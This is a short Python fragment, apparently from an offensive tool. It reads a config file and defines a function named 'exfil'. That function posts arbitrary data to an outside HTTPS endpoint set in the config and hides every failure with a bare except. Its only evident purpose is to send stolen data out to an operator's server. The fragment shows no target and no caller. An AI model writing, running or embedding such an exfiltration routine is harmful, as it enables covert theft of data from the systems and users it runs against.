import requests
import json
with open("config.json") as f:
    CONFIG = json.load(f)

def exfil(data):
    try:
        requests.post(CONFIG['https_endpoint'], data={"d": data}, timeout=5)
    except: pass